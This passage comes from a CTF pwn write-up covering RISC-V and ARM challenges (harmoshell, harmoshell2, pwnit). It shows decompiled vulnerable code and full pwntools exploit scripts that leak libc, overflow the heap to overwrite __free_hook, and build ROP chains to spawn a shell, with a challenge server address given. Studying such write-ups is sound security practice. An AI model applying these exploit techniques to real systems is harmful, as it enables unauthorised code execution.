class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;cat &#x27;</span> + n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">echo</span>(<span class="hljs-params">t, n, d</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;echo &#x27;</span> + t + <span class="hljs-string">&#x27; &#x27;</span> + n)<br>	s(d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-comment"># leak libc</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>		touch(<span class="hljs-built_in">str</span>(i).encode())<br>	<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>		rm(<span class="hljs-built_in">str</span>(<span class="hljs-number">7</span> - i).encode())<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		touch(<span class="hljs-built_in">str</span>(i).encode())<br><br>	touch(<span class="hljs-string">b&#x27;7&#x27;</span>)<br>	echo(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + <span class="hljs-string">&#x27;&amp;&#x27;</span>)<br>	cat(<span class="hljs-string">&#x27;7&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;&amp;&#x27;</span>)<br>	leak = u64(r(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	libc_base = <span class="hljs-number">0x0000004000000000</span> + leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	touch(<span class="hljs-string">b&#x27;debug&#x27;</span>)<br>	csu_c = <span class="hljs-number">0x0001181a</span><br>	csu_i = <span class="hljs-number">0x0001182c</span><br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	bin_sh = libc_base + <span class="hljs-number">0xed4b0</span><br>	li(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>	p = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x138</span><br>	<span class="hljs-comment">#p += p64(system)</span><br>	<span class="hljs-comment">#p += p64(bin_sh)</span><br><br>	<span class="hljs-comment"># modify a0 arg</span><br>	p += p64(csu_i)<br>	p += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># null</span><br>	p += p64(<span class="hljs-number">8</span>) <span class="hljs-comment"># s5 -&gt; a2</span><br>	p += p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>] + <span class="hljs-number">8</span>) <span class="hljs-comment"># s4 -&gt; a1</span><br>	p += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># s3 -&gt; a0</span><br>	p += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># s2 -&gt; bypass jump</span><br>	p += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># s1 -&gt; bypass jump</span><br>	p += p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) <span class="hljs-comment"># s0 -&gt; call</span><br>	p += p64(csu_c)<br><br>	p += p64(<span class="hljs-number">0</span>)<br>	<span class="hljs-comment">#p += p64(0)</span><br>	p += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># s5 -&gt; a2</span><br>	p += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># s4 -&gt; a1</span><br>	p += p64(bin_sh) <span class="hljs-comment"># s3 -&gt; a0</span><br>	p += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># s2 -&gt; bypass jump</span><br>	p += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># s1 -&gt; bypass jump</span><br>	p += p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>] + <span class="hljs-number">8</span>) <span class="hljs-comment"># call our func</span><br>	p += p64(csu_c)<br><br>	echo(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, p)<br>	s(p64(system))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(<span class="hljs-string">&#x27;./harmoshell&#x27;</span>)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = process([<span class="hljs-string">&#x27;./qemu-riscv64&#x27;</span>, <span class="hljs-string">&#x27;-L&#x27;</span> , <span class="hljs-string">&#x27;./libs&#x27;</span>, elf_path])<br>			<span class="hljs-comment">#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])</span><br>		<span class="hljs-keyword">else</span>:<br>			io = process([<span class="hljs-string">&#x27;./qemu-riscv64&#x27;</span>, <span class="hljs-string">&#x27;-L&#x27;</span> , <span class="hljs-string">&#x27;./libs&#x27;</span>, elf_path])<br>			<span class="hljs-comment">#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])</span><br>	<span class="hljs-keyword">else</span>:<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h2 id="shell2"><a href="#shell2" class="headerlink" title="shell2"></a>shell2</h2><h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     em_riscv-64-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX disabled<br>PIE:      No PIE (0x10000)<br>RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>



<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">echo</span><span class="hljs-params">(longlong param_1)</span><br><br>&#123;<br>  longlong lVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">ssize_t</span> sVar3;<br>  undefined4 extraout_var;<br>  undefined4 extraout_var_00;<br>  <span class="hljs-type">size_t</span> __nbytes;<br>  <span class="hljs-type">char</span> *__s1;<br>  undefined8 uVar4;<br>  undefined auStack288 [<span class="hljs-number">256</span>];<br>  <br>  lVar1 = *(longlong *)(param_1 + <span class="hljs-number">8</span>);<br>  __s1 = *(<span class="hljs-type">char</span> **)(lVar1 + <span class="hljs-number">8</span>);<br>  iVar2 = <span class="hljs-built_in">strcmp</span>(__s1,<span class="hljs-string">&quot;&gt;&quot;</span>);<br>  <span class="hljs-keyword">if</span> (CONCAT44(extraout_var,iVar2) == <span class="hljs-number">0</span>) &#123;<br>    uVar4 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar2 = <span class="hljs-built_in">strcmp</span>(__s1,<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    uVar4 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (CONCAT44(extraout_var_00,iVar2) != <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return*/</span><br>      FUN_000113ee();<br>    &#125;<br>  &#125;<br>  lVar1 = FUN_000110bc(*(undefined8 *)(lVar1 +<span class="hljs-number">0x10</span>));<br>  __nbytes = <span class="hljs-number">0x100</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> &lt; lVar1) &#123;<br>    __nbytes = *(<span class="hljs-type">size_t</span> *)(*(longlong*)(&amp;gp0xfffffffffffffa60 + lVar1 * <span class="hljs-number">8</span>) + <span class="hljs-number">0x18</span>);<br>  &#125;<br>  sVar3 = read(<span class="hljs-number">0</span>,auStack288,__nbytes);<br>  FUN_00011384(*(undefined8 *)(*(longlong*)(param_1 + <span class="hljs-number">8</span>) +<span class="hljs-number">0x10</span>),auStack288,(longlong)sVar3,uVar4);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>The vulnerability is heap overflow. we can use <code>echo &gt;&gt; nmae</code> to realize it</p>
<h3 id="gdb-script-1"><a href="#gdb-script-1" class="headerlink" title="gdb script"></a>gdb script</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/sh</span><br>gdb-multiarch --nh \<br>        -ex <span class="hljs-string">&quot;add-symbol-file ./harmoshell2&quot;</span> \<br>        -ex <span class="hljs-string">&quot;set architecture riscv:rv64&quot;</span> \<br>        -ex <span class="hljs-string">&quot;target remote 127.0.0.1:1234&quot;</span><br></code></pre></td></tr></table></figure>



<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;./harmoshell2&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;libs/lib/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;121.36.192.114&quot;</span><br>server_port = <span class="hljs-number">9999</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">1</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;touch &#x27;</span> + n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;rm &#x27;</span> + n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>():<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>(<span class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;cat &#x27;</span> + n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">echo</span>(<span class="hljs-params">t, n, d</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;echo &#x27;</span> + t + <span class="hljs-string">&#x27; &#x27;</span> + n)<br>	s(d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-comment"># leak libc</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>		touch(<span class="hljs-built_in">str</span>(i).encode())<br>	<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>		rm(<span class="hljs-built_in">str</span>(<span class="hljs-number">7</span> - i).encode())<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		touch(<span class="hljs-built_in">str</span>(i).encode())<br><br>	touch(<span class="hljs-string">b&#x27;7&#x27;</span>)<br>	echo(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + <span class="hljs-string">&#x27;&amp;&#x27;</span>)<br>	cat(<span class="hljs-string">&#x27;7&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;&amp;&#x27;</span>)<br>	leak = u64(r(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	libc_base = <span class="hljs-number">0x0000004000000000</span> + leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	touch(<span class="hljs-string">b&#x27;debug&#x27;</span>)<br>	csu_c = <span class="hljs-number">0x0001181a</span><br>	csu_i = <span class="hljs-number">0x0001182c</span><br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	bin_sh = libc_base + <span class="hljs-number">0xed4b0</span><br>	free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>	<span class="hljs-comment">#rm(b&#x27;8&#x27;)</span><br><br>	touch(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>	touch(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>	echo(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>	<span class="hljs-comment">#echo(&#x27;&gt;&#x27;, &#x27;b&#x27;, &#x27;B&#x27; * 0x100)</span><br>	p = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>)<br>	p += <span class="hljs-string">b&#x27;b&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	p += p64(free_hook) + p64(<span class="hljs-number">0x100</span>)<br>	echo(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,  p) <span class="hljs-comment"># heap overflow</span><br>	li(<span class="hljs-string">&#x27;__free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>	echo(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, p64(system))<br>	rm(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>	<span class="hljs-comment">#touch(b&#x27;debug&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = process([<span class="hljs-string">&#x27;./qemu-riscv64&#x27;</span>, <span class="hljs-string">&#x27;-L&#x27;</span> , <span class="hljs-string">&#x27;./libs&#x27;</span>, elf_path])<br>			<span class="hljs-comment">#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])</span><br>		<span class="hljs-keyword">else</span>:<br>			io = process([<span class="hljs-string">&#x27;./qemu-riscv64&#x27;</span>, <span class="hljs-string">&#x27;-L&#x27;</span> , <span class="hljs-string">&#x27;./libs&#x27;</span>, elf_path])<br>			<span class="hljs-comment">#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])</span><br>	<span class="hljs-keyword">else</span>:<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h3 id="pwnit"><a href="#pwnit" class="headerlink" title="pwnit"></a>pwnit</h3><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     arm-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x10000)<br></code></pre></td></tr></table></figure>

<h3 id="vul-2"><a href="#vul-2" class="headerlink" title="vul"></a>vul</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  char buf[260]; // [sp+0h] [bp-104h] BYREF<br><br>  setvbuf((FILE *)stdout, 0, 2, 0);<br>  printf(&quot;input: &quot;);<br>  read(0, buf, 0x300u);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>It’s easy to found the vul. use arm gadget to exploit it! so we must leak libc before modify something</p>
<p>Use print print.got table to leak</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">main = <span class="hljs-number">0x000104A0</span><br><span class="hljs-comment">#gadget_2 = 0x000104F8 #  MOV R0, R3;SUB SP, R11, #4; POP &#123;R11,PC&#125;</span><br>gadget_1 = <span class="hljs-number">0x00010348</span> <span class="hljs-comment"># pop &#123;r3, pc&#125;</span><br>gadget_2 = <span class="hljs-number">0x000104D8</span> <span class="hljs-comment"># printf</span><br>gadget_3 = <span class="hljs-number">0x00010500</span> <span class="hljs-comment"># pop &#123;R11,PC&#125;</span><br>gadget_4 = <span class="hljs-number">0x000104F8</span><br>p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x104</span><br>p += p32(gadget_1)<br>p += p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>p += p32(gadget_3)<br>p += p32(<span class="hljs-number">1</span>) <span class="hljs-comment"># r11</span><br><span class="hljs-comment">#p += p32(elf.plt[&#x27;printf&#x27;])</span><br>p += p32(gadget_2)<br><span class="hljs-comment">#li(&#x27;ru&#x27;)</span><br>sla(<span class="hljs-string">&#x27;input:&#x27;</span>, p)<br></code></pre></td></tr></table></figure>

<p>So we can leak libc address, but we found that the address not change by every attack, so the aslr protector is off</p>
<p>Next attack, we just use modifying r0 regiseter gadget in libc to create a system(“&#x2F;bin&#x2F;sh”) rop chain to get shell</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span 